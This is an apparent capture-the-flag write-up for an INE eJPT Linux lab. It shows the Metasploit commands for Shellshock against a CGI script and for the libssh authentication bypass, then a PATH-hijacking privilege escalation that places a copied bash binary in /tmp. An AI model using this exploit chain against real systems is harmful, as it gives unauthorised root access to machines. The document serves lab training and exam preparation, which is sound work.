# System/Host-Based Attacks CTF 2 (Linux) - INE eJPT

INE CTF covering three Linux attack techniques across two targets. Target1 exploits a Shellshock-vulnerable CGI endpoint via Metasploit. Target2 exploits libssh authentication bypass. Post-exploitation on target2 involves binary hijacking via a custom `welcome` binary that calls a relative path.

Targets: `target1.ine.local` (Apache 2.4.6 + CGI) | `target2.ine.local` (libssh 0.8.3)

---

## Phase 1 - target1: Shellshock via Apache mod_cgi

### Reconnaissance

```bash
nmap -sC -sV target1.ine.local
```

Port 80 open - Apache 2.4.6. Directory `/browser.cgi` accessible.

### Exploitation - Shellshock (CVE-2014-6271)

```bash
msfconsole -q
use exploit/multi/http/apache_mod_cgi_bash_env_exec
set RHOSTS target1.ine.local
set TARGETURI /browser.cgi
set LHOST 10.4.23.61
exploit
```

Meterpreter session obtained. Shellshock injects into the CGI environment via bash function definitions in HTTP headers.

```bash
shell
cat /flag1
cat /flag2
```

```
40669ec...
4fdde55f...
```

---

## Phase 2 - target2: libssh Authentication Bypass

### Reconnaissance

```bash
nmap -sC -sV target2.ine.local
```

Port 22 open - libssh 0.8.3.

### Vulnerability

libssh 0.8.3 is vulnerable to CVE-2018-10933 - an authentication bypass where sending an `SSH2_MSG_USERAUTH_SUCCESS` message to the server triggers session acceptance without valid credentials.

### Exploitation

```bash
use auxiliary/scanner/ssh/libssh_auth_bypass
set RHOSTS target2.ine.local
set SPAWN_PTY true
run
```

Shell obtained as root.

```bash
cat /flag3
```

```
5846673e...
```

---

## Phase 3 - Privilege Escalation on target2: Binary Hijacking

Shell from libssh auth bypass may land in a restricted context. A custom binary `/usr/local/bin/welcome` runs with elevated privileges.

```bash
strings /usr/local/bin/welcome
```

Output reveals a call to `greetings` without an absolute path - the binary resolves `greetings` from `$PATH`.

```bash
cd /tmp
rm -f greetings
cp /bin/bash greetings
chmod +x greetings
export PATH=/tmp:$PATH
/usr/local/bin/welcome
```

Bash executes as root. Flag 4 in `/root`.

```
3b090ea8...
```

---

## Key Takeaways

- Shellshock requires Apache `mod_cgi` to be active and a CGI script present - `nmap -sV` identifying Apache 2.4.6 combined with a `.cgi` path found by gobuster is sufficient to attempt the vector.
- libssh 0.8.3 authentication bypass is a protocol-level flaw. No credentials are needed - the module sends a crafted SSH2 message that the server accepts as a successful login.
- Binary hijacking exploits any SUID/privileged binary that calls executables via relative paths. `strings` on the target binary surfaces these calls faster than static analysis.
- The attack chain for binary hijacking: `strings` to identify relative call -> `cp /bin/bash <name>` to create the spoofed binary -> `PATH` manipulation -> trigger the privileged binary.

---

## Disclaimer

This lab was completed in a controlled environment provided by INE as part of the eJPT preparation path. All actions were performed strictly for educational purposes.
